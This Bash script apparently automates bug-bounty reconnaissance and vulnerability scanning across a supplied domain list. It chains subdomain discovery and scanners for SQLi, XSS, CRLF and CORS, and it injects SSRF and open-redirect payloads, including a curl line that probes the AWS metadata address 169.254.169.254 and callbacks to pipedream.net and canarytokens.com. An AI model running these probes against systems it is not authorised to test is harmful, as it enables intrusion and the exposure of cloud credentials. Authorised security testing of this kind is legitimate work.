#!/bin/bash

set -e
set -o pipefail

blue='\033[1;34m'
reset='\033[0m'

TS=$(date +"%Y-%m-%d_%H-%M")
OUTDIR="mini_auto_out_$TS"

echo "==========================================="
echo -e "${blue}🚀 Recon Automation Script by Maddy${reset}"
echo "==========================================="

read -rp "Enter path to domain list (one domain per line): " DOMAINS

if [[ ! -f "$DOMAINS" ]]; then
    echo "[!] File not found: $DOMAINS"
    exit 1
fi

LIVE_INPUT="live_subdomains.txt"
LIVEDOMAINS="$OUTDIR/usable_targets.txt"
JSURLS="livejs.txt"
NUCLEI_OUT="$OUTDIR/nuclei"
JAELES_OUT="$OUTDIR/jaeles"
PARAM_OUT="$OUTDIR/params"
ALLPARAMS="$PARAM_OUT/all_params.txt"

mkdir -p "$NUCLEI_OUT" "$JAELES_OUT" "$PARAM_OUT"

# Subfinder + httpx
echo "[+] Running subfinder on domains..."
subfinder -dL "$DOMAINS" -silent -o temp_subs.txt
httpx -l temp_subs.txt -silent > "$LIVE_INPUT"
rm temp_subs.txt

mkdir -p "$OUTDIR"
cp "$LIVE_INPUT" "$OUTDIR/"
cd "$OUTDIR" || { echo "[!] Cannot enter $OUTDIR"; exit 1; }

/home/maddy/techiee/bug_bounty/2_phase_recon_autom/mini_automation/dir_finder.sh "$LIVE_INPUT"
echo -e "${blue}[*] Running CVEs testing...${reset}"
/home/maddy/techiee/bug_bounty/2_phase_recon_autom/general/cves/cve.sh "$LIVE_INPUT"

mkdir aut1_res
cp "$LIVE_INPUT" aut1_res/
cd aut1_res || exit
/home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/k_automation/testing.sh "$LIVE_INPUT"
cd ..

# Filter live domains
httpx -l "$LIVE_INPUT" -silent -no-color -status-code -fr |
  grep -Ev "\[(401|404|501|502)\]" |
  cut -d " " -f1 > "$LIVEDOMAINS"

# Jaeles & Nuclei
if [[ -s "$LIVEDOMAINS" ]]; then
    echo "[+] Running Jaeles on live domains..."
    cat "$LIVEDOMAINS" | jaeles scan -c 50 -o "$JAELES_OUT/jaeles_domain_out"

    echo "[+] Running Nuclei on live domains..."
    nuclei -l "$LIVEDOMAINS" -s critical,high,medium,low -o "$NUCLEI_OUT/nuclei_domain1_out" -stats -retries 2
    nuclei -l "$LIVEDOMAINS" -t "/home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec" -s critical,high,medium,low -o "$NUCLEI_OUT/nuclei_domain3_out" -stats -retries 2
else
    echo "[!] $LIVEDOMAINS not found or empty. Skipping domain scans."
fi

# ParamSpider and LostFuzzer
paramspider -l "$LIVEDOMAINS" || echo "ParamSpider failed"
/home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/lostfuzzer.sh | tee -a "$NUCLEI_OUT/nuclei_lostfuzzer_out"
mv filtered_urls.txt loxs_param.txt

cat results/* loxs_param.txt | sort -u > all_param_urls
httpx -l all_param_urls -silent -mc 200,202,201,204,205,206,207,208,301,302,403,401 > live_urls.txt

cat live_urls.txt |
  grep -E '\?.+=.+' |
  grep -Ev 'woff2|woff|ttf|svg|eot|css|js|png|jpeg|gif|ico|cdn|cloudflare|googleapis|...' |
  sort -u > "$PARAM_OUT/filtered_urls_to_analyze.txt"

cat results/* regex.txt loxs_param.txt |
  grep -Ei '([?&](image|file|img|url|link)=)' |
  sort -u >> "$PARAM_OUT/filtered_urls_to_analyze.txt" || true

cat "$PARAM_OUT/filtered_urls_to_analyze.txt" | qsreplace FUZZ | sort -u > urls.txt
python3 ~/techiee/bug_bounty/2_phase_recon_autom/tools/unique_urls.py urls.txt
mv unique_urls.txt "$ALLPARAMS"
rm live_urls.txt all_param_urls urls.txt

# DAST scan
if [[ -s "$ALLPARAMS" ]]; then
    nuclei -l "$ALLPARAMS" -dast -retries 2 -o "$NUCLEI_OUT/dast_out.txt" -stats

    echo "[*] SQLi testing..."
    nuclei -tags sqli,injection -l "$ALLPARAMS" --rate-limit 200 --retries 2 -o "$OUTDIR/sqli_results.txt" -stats

    echo "[*] XSS testing..."
    python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/xss_vibes/main.py -f "$ALLPARAMS" -o "$OUTDIR/xss_vibes_out"

    echo "[*] Open Redirect..."
    cat all_urls.txt "$ALLPARAMS" | grep -iE "=(http|https):\/\/|redirect|url=" | tee -a urls.txt
    python3 ~/techiee/bug_bounty/2_phase_recon_autom/tools/unique_urls.py
    mv unique_urls.txt "$OUTDIR/redirect_params.txt"

    cat "$OUTDIR/redirect_params.txt" | qsreplace "https://canarytokens.com/abc" | httpx -silent -fr -no-color -status-code | grep "\[3" >> "$OUTDIR/open_httpx_out.txt"
    cat "$OUTDIR/redirect_params.txt" | qsreplace "https://canarytokens.com/abc" | nuclei -tags redirect -c 30 -o "$OUTDIR/open_nuclei_out.txt" -retries 2 -stats

    cat "$OUTDIR/redirect_params.txt" | qsreplace 'https://pipedream.net/ssrf-test' >> "$OUTDIR/ssrf_urls_ffuf"
    ffuf -c -w "$OUTDIR/ssrf_urls_ffuf" -u FUZZ | tee -a "$OUTDIR/ssrf_ffuf_output.txt"

    cat "$OUTDIR/redirect_params.txt" | qsreplace 'http://169.254.169.254/latest/meta-data/hostname' | xargs -I % -P 25 sh -c 'resp=$(curl -ks --max-time 5 "%"); if echo "$resp" | grep -q "compute.internal"; then echo "SSRF VULN! %" >> "$OUTDIR/ssrf_aws"; fi'

    nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/blind-ssrf.yaml -l "$OUTDIR/redirect_params.txt" --retries 2 --dast -o "$OUTDIR/ssrf_nuclei_blind.txt" -stats
    nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/response-ssrf.yaml -l "$OUTDIR/redirect_params.txt" --retries 2 --dast -o "$OUTDIR/ssrf_nuclei_response.txt" -stats

    echo "[*] WordPress Testing..."
    nuclei -l "$LIVE_INPUT" -t ~/nuclei-templates/http/vulnerabilities/wordpress -o "$OUTDIR/wordpress_vuln.txt" -stats -retries 2
    nuclei -l "$LIVE_INPUT" -t ~/nuclei-templates/http/technologies/wordpress-detect.yaml -o "$OUTDIR/wordpress_detect.txt" -stats -retries 2

    echo "[*] CORS Misconfigurations..."
    nuclei -l "$LIVE_INPUT" -tags cors -o "$OUTDIR/nuclei_cors.txt" -stats

    echo "[*] CRLF Injection..."
    crlfuzz -l "$LIVEDOMAINS" | tee -a "$OUTDIR/crlf_crlfuzz.txt"
    nuclei -t ~/nuclei-templates/dast/vulnerabilities/crlf/ -l "$LIVEDOMAINS" -dast -o "$OUTDIR/crlf_nuclei_out1.txt" -stats -retries 2
    nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/crlf-injection-generic.yaml -l "$LIVEDOMAINS" -o "$OUTDIR/crlf_nuclei_out2.txt" -stats -retries 2
    nuclei -t ~/nuclei-templates/http/vulnerabilities/other/viewlinc-crlf-injection.yaml -l "$LIVEDOMAINS" -o "$OUTDIR/crlf_nuclei_out3.txt" -stats -retries 2
fi

# Final wrap-up
cat "$NUCLEI_OUT"/*.txt | sort -u > "$NUCLEI_OUT/all.txt"
/home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/remove_duplicates.sh "$NUCLEI_OUT/all.txt"
mv nuclei-output-all.txt "$NUCLEI_OUT/"

find ./ -type f -empty -delete

echo -e "${blue}All scans completed successfully.${reset}"
echo "============================================"
echo -e "[+] Automation Completed!.. keep pushing Maddyyy!"
echo "============================================"
